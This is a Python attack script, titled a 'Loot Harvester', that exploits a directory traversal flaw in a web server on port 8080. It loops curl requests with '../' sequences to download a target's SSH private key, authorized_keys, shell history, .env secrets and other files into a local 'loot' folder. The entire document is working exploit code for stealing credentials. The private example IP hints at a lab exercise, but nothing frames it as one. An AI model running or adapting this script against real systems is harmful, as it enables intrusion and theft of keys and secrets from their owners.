import subprocess
import os
import argparse

parser = argparse.ArgumentParser(description="SafeNet Auto-Exfil: Automated Directory Traversal Loot Harvester")
parser.add_argument("--target", type=str, required=True, 
                    help="The IP address of the vulnerable target (e.g., 192.168.122.5)")
parser.add_argument("--depth", type=int, default=4, 
                    help="Number of '..' to use for traversal (default: 4)")

args = parser.parse_args()

# --- CONFIGURATION ---
TARGET = args.target
DEPTH = args.depth
PORT = "8080"  #the port for python http.server

#traversal path dynamically
TRAVERSAL = "/" + ("../" * DEPTH)

#targets
FILES = [
    ".zsh_history",
    ".bashrc",
    ".bash_aliases",
    ".ssh/id_rsa",
    ".ssh/authorized_keys",
    "inventory_scanner.py",
    ".env"
]

#loot folder
output_dir = f"loot_{TARGET}"
os.makedirs(output_dir, exist_ok=True)

print(f"[+] Target: {TARGET}:{PORT}")
print(f"[+] Traversal Depth: {DEPTH} (Path: {TRAVERSAL})")
print(f"[+] Starting automated exfiltration...\n")

for file_path in FILES:
    full_path = f"{TRAVERSAL}{file_path}"
    print(f"[*] Harvesting: {full_path}")
    
    result = subprocess.run(
        ["curl", "--path-as-is", "-s", "-o", f"{output_dir}/{file_path.split('/')[-1]}", "-w", "%{http_code}",
         f"http://{TARGET}:{PORT}/{full_path}"],
        capture_output=True, text=True)
    
    code = result.stdout.strip()
    
    if code == "200":
        print(f"    SUCCESS! Saved to {output_dir}/")
    elif code == "403":
        print(f"    Forbidden! Exists but blocked.")
    else:
        print(f"    Not found.")
        
print(f"\n[+] Exfiltration complete. Check the '{output_dir}' folder for loot.")

